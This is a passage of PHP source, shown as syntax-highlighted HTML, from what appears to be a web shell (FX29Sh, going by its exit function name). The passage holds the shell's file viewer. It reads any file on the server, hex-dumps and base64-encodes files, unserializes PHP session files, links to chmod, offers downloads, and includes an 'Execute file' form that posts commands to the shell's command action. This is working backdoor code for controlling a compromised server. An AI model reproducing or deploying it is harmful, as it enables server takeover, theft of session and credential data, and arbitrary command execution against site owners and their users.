<span class="s1">                   &quot;&amp;lt;a href=\&quot;&quot;.$surl.&quot;act=f&amp;f=&quot;.urlencode($f).&quot;&amp;ft=edit&amp;d=&quot;.urlencode($d).&quot;&amp;c=1\&quot;&amp;gt;&amp;lt;u&amp;gt;Create&amp;lt;/u&amp;gt;&amp;lt;/a&amp;gt;&quot;);</span>
<span class="s1">      }</span>
<span class="s1">    }</span>
<span class="s1">    else {</span>
<span class="s1">      $r   = @file_get_contents($d.$f);</span>
<span class="s1">      $ext = explode(&quot;.&quot;,$f);</span>
<span class="s1">      $c   = count($ext)-1;</span>
<span class="s1">      $ext = $ext[$c];</span>
<span class="s1">      $ext = strtolower($ext);</span>
<span class="s1">      $rft = &quot;&quot;;</span>
<span class="s1">      foreach ($ftypes as $k =&amp;gt; $v) {</span>
<span class="s1">        if (in_array($ext,$v)) { $rft = $k; break; }</span>
<span class="s1">      }</span>
<span class="s1">      if (eregi(&quot;sess_(.*)&quot;,$f)) { $rft = &quot;phpsess&quot;; }</span>
<span class="s1">      if (empty($ft)) { $ft = $rft; }</span>
<span class="s1">      $arr = array(</span>
<span class="s1">          array(&quot;&amp;lt;img src=\&quot;&quot;.$surl.&quot;act=img&amp;img=ext_diz\&quot; alt=\&quot;Info\&quot;&amp;gt;&quot;,&quot;info&quot;),</span>
<span class="s1">          array(&quot;&amp;lt;img src=\&quot;&quot;.$surl.&quot;act=img&amp;img=ext_html\&quot; alt=\&quot;html\&quot;&amp;gt;&quot;,&quot;html&quot;),</span>
<span class="s1">          array(&quot;&amp;lt;img src=\&quot;&quot;.$surl.&quot;act=img&amp;img=ext_txt\&quot; alt=\&quot;txt\&quot;&amp;gt;&quot;,&quot;txt&quot;),</span>
<span class="s1">          array(&quot;&amp;lt;img src=\&quot;&quot;.$surl.&quot;act=img&amp;img=ext_ini\&quot; alt=\&quot;ini\&quot;&amp;gt;&quot;,&quot;ini&quot;),</span>
<span class="s1">          array(&quot;Code&quot;,&quot;code&quot;),</span>
<span class="s1">          array(&quot;Session&quot;,&quot;phpsess&quot;),</span>
<span class="s1">          array(&quot;SDB&quot;,&quot;sdb&quot;),</span>
<span class="s1">          array(&quot;&amp;lt;img src=\&quot;&quot;.$surl.&quot;act=img&amp;img=ext_exe\&quot; alt=\&quot;exe\&quot;&amp;gt;&quot;,&quot;exe&quot;),</span>
<span class="s1">          array(&quot;&amp;lt;img src=\&quot;&quot;.$surl.&quot;act=img&amp;img=ext_gif\&quot; alt=\&quot;img\&quot;&amp;gt;&quot;,&quot;img&quot;),</span>
<span class="s1">          array(&quot;&amp;lt;img src=\&quot;&quot;.$surl.&quot;act=img&amp;img=ext_rtf\&quot; alt=\&quot;Notepad\&quot;&amp;gt;&quot;,&quot;notepad&quot;),</span>
<span class="s1">          array(&quot;&amp;lt;img src=\&quot;&quot;.$surl.&quot;act=img&amp;img=change\&quot; alt=\&quot;Edit\&quot;&amp;gt;&quot;,&quot;edit&quot;),</span>
<span class="s1">          array(&quot;&amp;lt;img src=\&quot;&quot;.$surl.&quot;act=img&amp;img=download\&quot; alt=\&quot;Download\&quot;&amp;gt;&quot;,&quot;download&quot;)</span>
<span class="s1">      );</span>
<span class="s1">      echo &quot;&amp;lt;div class=barheader&amp;gt;.: File Viewer [&quot;.$f.&quot; (&quot;.view_size(filesize($d.$f)).&quot;) &quot;.view_perms_color($d.$f).&quot;) :.\n&quot;;</span>
<span class="s1">      echo &quot;&amp;lt;hr size=1 noshade&amp;gt;\n&quot;;</span>
<span class="s1">      foreach($arr as $t) {</span>
<span class="s1">        if ($t[1] == $rft) { echo &quot;&amp;lt;a href=\&quot;&quot;.$surl.&quot;act=f&amp;f=&quot;.urlencode($f).&quot;&amp;ft=&quot;.$t[1].&quot;&amp;d=&quot;.urlencode($d).&quot;\&quot;&amp;gt;&amp;lt;font color=#3366FF&amp;gt;&quot;.$t[0].&quot;&amp;lt;/font&amp;gt;&amp;lt;/a&amp;gt;&quot;; }</span>
<span class="s1">        elseif ($t[1] == $ft) { echo &quot;&amp;lt;a href=\&quot;&quot;.$surl.&quot;act=f&amp;f=&quot;.urlencode($f).&quot;&amp;ft=&quot;.$t[1].&quot;&amp;d=&quot;.urlencode($d).&quot;\&quot;&amp;gt;&amp;lt;b&amp;gt;&amp;lt;u&amp;gt;&quot;.$t[0].&quot;&amp;lt;/u&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&quot;; }</span>
<span class="s1">        else { echo &quot;&amp;lt;a href=\&quot;&quot;.$surl.&quot;act=f&amp;f=&quot;.urlencode($f).&quot;&amp;ft=&quot;.$t[1].&quot;&amp;d=&quot;.urlencode($d).&quot;\&quot;&amp;gt;&amp;lt;b&amp;gt;&quot;.$t[0].&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&quot;; }</span>
<span class="s1">        echo &quot; (&amp;lt;a href=\&quot;&quot;.$surl.&quot;act=f&amp;f=&quot;.urlencode($f).&quot;&amp;ft=&quot;.$t[1].&quot;&amp;d=&quot;.urlencode($d).&quot;&amp;newwin=1\&quot; title=\&quot;New Window\&quot; target=\&quot;_blank\&quot;&amp;gt;+&amp;lt;/a&amp;gt;) &quot;;</span>
<span class="s1">      }</span>
<span class="s1">      echo &quot;&amp;lt;/div&amp;gt;\n&quot;;</span>
<span class="s1">      if ($ft == &quot;info&quot;) {</span>
<span class="s1">        echo &quot;&amp;lt;br&amp;gt;&amp;lt;div class=barheader&amp;gt;Information&amp;lt;/div&amp;gt;\n&quot;.</span>
<span class="s1">             &quot;&amp;lt;table class=contents&amp;gt;\n&quot;.</span>
<span class="s1">             &quot;&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;Path&amp;lt;/th&amp;gt;&amp;lt;td&amp;gt;&quot;.$d.$f.&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;\n&quot;.</span>
<span class="s1">             &quot;&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;Size&amp;lt;/th&amp;gt;&amp;lt;td&amp;gt;&quot;.view_size(filesize($d.$f)).&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;\n&quot;.</span>
<span class="s1">             &quot;&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;MD5&amp;lt;/th&amp;gt;&amp;lt;td&amp;gt;&quot;.md5_file($d.$f).&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;\n&quot;;</span>
<span class="s1">        if (!is_windows()) {</span>
<span class="s1">          echo &quot;&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;&amp;lt;b&amp;gt;Owner/Group&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;;</span>
<span class="s1">          $ow = posix_getpwuid(fileowner($d.$f));</span>
<span class="s1">          $gr = posix_getgrgid(filegroup($d.$f));</span>
<span class="s1">          echo ($ow[&quot;name&quot;]?$ow[&quot;name&quot;]:fileowner($d.$f)).&quot;/&quot;.($gr[&quot;name&quot;]?$gr[&quot;name&quot;]:filegroup($d.$f));</span>
<span class="s1">        }</span>
<span class="s1">        echo &quot;&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;Perms&amp;lt;/th&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=\&quot;&quot;.$surl.&quot;act=chmod&amp;f=&quot;.urlencode($f).&quot;&amp;d=&quot;.urlencode($d).&quot;\&quot;&amp;gt;&quot;.view_perms_color($d.$f).&quot;&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;\n&quot;.</span>
<span class="s1">             &quot;&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;Create time&amp;lt;/th&amp;gt;&amp;lt;td&amp;gt;&quot;.date(&quot;d/m/Y H:i:s&quot;,filectime($d.$f)).&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;\n&quot;.</span>
<span class="s1">             &quot;&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;Access time&amp;lt;/th&amp;gt;&amp;lt;td&amp;gt; &quot;.date(&quot;d/m/Y H:i:s&quot;,fileatime($d.$f)).&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;\n&quot;.</span>
<span class="s1">             &quot;&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;Modify time&amp;lt;/th&amp;gt;&amp;lt;td&amp;gt; &quot;.date(&quot;d/m/Y H:i:s&quot;,filemtime($d.$f)).&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;\n&quot;;</span>
<span class="s1">        echo &quot;&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;HexDump&amp;lt;/th&amp;gt;&amp;lt;td&amp;gt;\n&quot;.</span>
<span class="s1">             &quot;[ &amp;lt;a href=\&quot;&quot;.$surl.&quot;act=f&amp;f=&quot;.urlencode($f).&quot;&amp;ft=info&amp;fullhexdump=1&amp;d=&quot;.urlencode($d).&quot;\&quot;&amp;gt;Full&amp;lt;/a&amp;gt; ] &quot;.</span>
<span class="s1">             &quot;[ &amp;lt;a href=\&quot;&quot;.$surl.&quot;act=f&amp;f=&quot;.urlencode($f).&quot;&amp;ft=info&amp;d=&quot;.urlencode($d).&quot;\&quot;&amp;gt;Preview&amp;lt;/a&amp;gt; ]&amp;lt;br&amp;gt;\n&quot;.</span>
<span class="s1">             &quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;\n&quot;.</span>
<span class="s1">             &quot;&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;Base64&amp;lt;/th&amp;gt;&amp;lt;td&amp;gt;\n&quot;.</span>
<span class="s1">             &quot;[ &amp;lt;a href=\&quot;&quot;.$surl.&quot;act=f&amp;f=&quot;.urlencode($f).&quot;&amp;ft=info&amp;base64=1&amp;d=&quot;.urlencode($d).&quot;\&quot;&amp;gt;Encode&amp;lt;/a&amp;gt; ] &quot;.</span>
<span class="s1">             &quot;[ &amp;lt;a href=\&quot;&quot;.$surl.&quot;act=f&amp;f=&quot;.urlencode($f).&quot;&amp;ft=info&amp;base64=2&amp;d=&quot;.urlencode($d).&quot;\&quot;&amp;gt;+chunk&amp;lt;/a&amp;gt; ] &quot;.</span>
<span class="s1">             &quot;[ &amp;lt;a href=\&quot;&quot;.$surl.&quot;act=f&amp;f=&quot;.urlencode($f).&quot;&amp;ft=info&amp;base64=3&amp;d=&quot;.urlencode($d).&quot;\&quot;&amp;gt;+chunk+quotes&amp;lt;/a&amp;gt; ] &quot;.</span>
<span class="s1">             &quot;[ &amp;lt;a href=\&quot;&quot;.$surl.&quot;act=f&amp;f=&quot;.urlencode($f).&quot;&amp;ft=info&amp;base64=4&amp;d=&quot;.urlencode($d).&quot;\&quot;&amp;gt;Decode&amp;lt;/a&amp;gt; ] &quot;.</span>
<span class="s1">             &quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;\n&quot;.</span>
<span class="s1">             &quot;&amp;lt;/table&amp;gt;&amp;lt;br&amp;gt;\n&quot;;</span>
<span class="s1">        $fi = fopen($d.$f,&quot;rb&quot;);</span>
<span class="s1">        if ($fi) {</span>
<span class="s1">          echo &quot;&amp;lt;div class=barheader&amp;gt;&quot;;</span>
<span class="s1">          if (@$fullhexdump) { echo &quot;Full HexDump&quot;; $str = fread($fi,filesize($d.$f)); }</span>
<span class="s1">          else { echo &quot;HexDump Preview&quot;; $str = fread($fi,$hexdump_lines*$hexdump_rows); }</span>
<span class="s1">          $n  = 0;</span>
<span class="s1">          $a0 = &quot;00000000&amp;lt;br&amp;gt;&quot;;</span>
<span class="s1">          $a1 = &quot;&quot;;</span>
<span class="s1">          $a2 = &quot;&quot;;</span>
<span class="s1">          for ($i=0; $i&amp;lt;strlen($str); $i++) {</span>
<span class="s1">            $a1 .= sprintf(&quot;%02X&quot;,ord($str[$i])).&quot; &quot;;</span>
<span class="s1">            switch (ord($str[$i])) {</span>
<span class="s1">              case 0 :  $a2 .= &quot;&amp;lt;font&amp;gt;0&amp;lt;/font&amp;gt;&quot;; break;</span>
<span class="s1">              case 32:</span>
<span class="s1">              case 10:</span>
<span class="s1">              case 13: $a2 .= &quot; &quot;; break;</span>
<span class="s1">              default: $a2 .= htmlspecialchars($str[$i]);</span>
<span class="s1">            }</span>
<span class="s1">            $n++;</span>
<span class="s1">            if ($n == $hexdump_rows) {</span>
<span class="s1">              $n = 0;</span>
<span class="s1">              if ($i+1 &amp;lt; strlen($str)) {$a0 .= sprintf(&quot;%08X&quot;,$i+1).&quot;&amp;lt;br&amp;gt;&quot;;}</span>
<span class="s1">              $a1 .= &quot;&amp;lt;br&amp;gt;&quot;;</span>
<span class="s1">              $a2 .= &quot;&amp;lt;br&amp;gt;&quot;;</span>
<span class="s1">            }</span>
<span class="s1">          }</span>
<span class="s1">          echo &quot;&amp;lt;/div&amp;gt;\n&quot;;</span>
<span class="s1">          echo &quot;&amp;lt;table class=code&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&quot;.$a0.&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;.$a1.&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;.$a2.&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&amp;lt;br&amp;gt;\n&quot;;</span>
<span class="s1">        }</span>
<span class="s1">        $henc = &quot;&quot;;</span>
<span class="s1">        $encoded  = &quot;&quot;;</span>
<span class="s1">        if (!isset($base64)) { $base64 = &quot;&quot;; }</span>
<span class="s1">        if ($base64 == 1) {</span>
<span class="s1">          $henc = &quot;Base64 Encode&quot;;</span>
<span class="s1">          $encoded = base64_encode(file_get_contents($d.$f));</span>
<span class="s1">        }</span>
<span class="s1">        elseif($base64 == 2) {</span>
<span class="s1">          $henc = &quot;Base64 Encode + Chunk&quot;;</span>
<span class="s1">          $encoded = chunk_split(base64_encode(file_get_contents($d.$f)));</span>
<span class="s1">        }</span>
<span class="s1">        elseif($base64 == 3) {</span>
<span class="s1">          $henc = &quot;Base64 Encode + Chunk + Quotes&quot;;</span>
<span class="s1">          $encoded = base64_encode(file_get_contents($d.$f));</span>
<span class="s1">          $encoded = substr(preg_replace(&quot;!.{1,76}!&quot;,&quot;&#39;</span><span class="nx">\</span><span class="o">&amp;</span><span class="c1">#92;&amp;#48;&#39;.\n&quot;,$encoded),0,-2);</span>
        <span class="p">}</span>
        <span class="k">elseif</span><span class="p">(</span><span class="nv">$base64</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
          <span class="nv">$text</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);</span>
          <span class="nv">$encoded</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$text</span><span class="p">);</span>
          <span class="nv">$henc</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Base64 Decode&quot;</span><span class="p">;</span>
          <span class="k">if</span> <span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$encoded</span><span class="p">)</span> <span class="o">!=</span> <span class="nv">$text</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$henc</span> <span class="o">.=</span> <span class="s2">&quot; (Failed!)&quot;</span><span class="p">;</span> <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$encoded</span><span class="p">))</span> <span class="p">{</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;div class=barheader&amp;gt;</span><span class="si">$henc</span><span class="s2">&amp;lt;/div&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;textarea cols=100 rows=10&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$encoded</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;&quot;</span><span class="p">;</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;html&quot;</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$newwin</span><span class="p">)</span> <span class="p">{</span> <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span> <span class="k">echo</span> <span class="nv">$r</span><span class="p">;</span> <span class="nx">fx29shexit</span><span class="p">();</span> <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span> <span class="k">echo</span> <span class="nv">$r</span><span class="p">;</span> <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;txt&quot;</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;textarea cols=</span><span class="se">\&quot;</span><span class="s2">125</span><span class="se">\&quot;</span><span class="s2"> rows=</span><span class="se">\&quot;</span><span class="s2">20</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$r</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;ini&quot;</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;pre&amp;gt;&quot;</span><span class="p">;</span> <span class="nb">var_dump</span><span class="p">(</span><span class="nb">parse_ini_file</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">,</span><span class="k">TRUE</span><span class="p">));</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/pre&amp;gt;&quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;phpsess&quot;</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;pre&amp;gt;&quot;</span><span class="p">;</span>
        <span class="nv">$v</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;|&quot;</span><span class="p">,</span><span class="nv">$r</span><span class="p">);</span>
        <span class="k">echo</span> <span class="nv">$v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
        <span class="nb">var_dump</span><span class="p">(</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/pre&amp;gt;&quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;exe&quot;</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">,</span><span class="nv">$f</span><span class="p">);</span>
        <span class="nv">$c</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$ext</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="nv">$ext</span> <span class="o">=</span> <span class="nv">$ext</span><span class="p">[</span><span class="nv">$c</span><span class="p">];</span>
        <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$ext</span><span class="p">);</span>
        <span class="nv">$rft</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$exeftypes</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
         <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$ext</span><span class="p">,</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$rft</span> <span class="o">=</span> <span class="nv">$k</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span>
        <span class="p">}</span>
        <span class="nv">$cmd</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;%f%&quot;</span><span class="p">,</span><span class="nv">$f</span><span class="p">,</span><span class="nv">$rft</span><span class="p">);</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Execute file:&amp;lt;/b&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;form name=</span><span class="se">\&quot;</span><span class="s2">f_xfile</span><span class="se">\&quot;</span><span class="s2"> action=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> method=POST&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;input type=hidden name=act value=cmd&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;input type=hidden name=</span><span class="se">\&quot;</span><span class="s2">d</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">cmd</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> size=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt; </span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">cmd_txt</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> checked&amp;gt; - Display in text-area</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;input type=submit name=submit value=</span><span class="se">\&quot;</span><span class="s2">Execute</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/form&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;sdb&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;pre&amp;gt;&quot;</span><span class="p">;</span> <span class="nb">var_dump</span><span class="p">(</span><span class="nb">unserialize</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$r</span><span class="p">)));</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/pre&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;code&quot;</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;div class=code style=</span><span class="se">\&quot;</span><span class="s2">background-color: &quot;</span><span class="o">.</span><span class="nv">$highlight_bg</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$newwin</span><span class="p">)</span> <span class="p">{</span> <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span> <span class="nb">highlight_file</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);</span> <span class="nx">fx29shexit</span><span class="p">();</span> <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span> <span class="nb">highlight_file</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);</span> <span class="p">}</span>
        <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&amp;lt;/div&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;notepad&quot;</span><span class="p">)</span> <span class="p">{</span>
        <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span>
        <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-type: text/plain&quot;</span><span class="p">);</span>
        <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-disposition: attachment; filename=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$f</span><span class="o">.</span><span class="s2">&quot;.txt</span><span class="se">\&quot;</span><span class="s2">;&quot;</span><span class="p">);</span>
        <span class="k">echo</span><span class="p">(</span><span class="nv">$r</span><span class="p">);</span>
        <span class="k">exit</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;download&quot;</span><span class="p">)</span> <span class="p">{</span>
        <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span>
        <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-type: application/octet-stream&quot;</span><span class="p">);</span>
        <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-length: &quot;</span><span class="o">.</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">));</span>
        <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-disposition: attachment; filename=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$f</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">;&quot;</span><span class="p">);</span>
        <span class="k">echo</span> <span class="nv">$r</span><span class="p">;</span>
        <span class="k">exit</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;img&quot;</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$inf</span> <span class="o">=</span> <span class="nb">getimagesize</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$newwin</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$imgsize</span><span class="p">))</span> <span class="p">{</span><span class="nv">$imgsize</span> <span class="o">=</span> <span class="mi">20</span><span class="p">;}</span>
          <span class="nv">$width</span> <span class="o">=</span> <span class="nv">$inf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">/</span><span class="mi">100</span><span class="o">*</span><span class="nv">$imgsize</span><span class="p">;</span>
          <span class="nv">$height</span> <span class="o">=</span> <span class="nv">$inf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">/</span><span class="mi">100</span><span class="o">*</span><span class="nv">$imgsize</span><span class="p">;</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Size:&amp;lt;/b&amp;gt; &quot;</span><span class="p">;</span>
          <span class="nv">$sizes</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;100&quot;</span><span class="p">,</span><span class="s2">&quot;50&quot;</span><span class="p">,</span><span class="s2">&quot;20&quot;</span><span class="p">);</span>
          <span class="k">foreach</span> <span class="p">(</span><span class="nv">$sizes</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
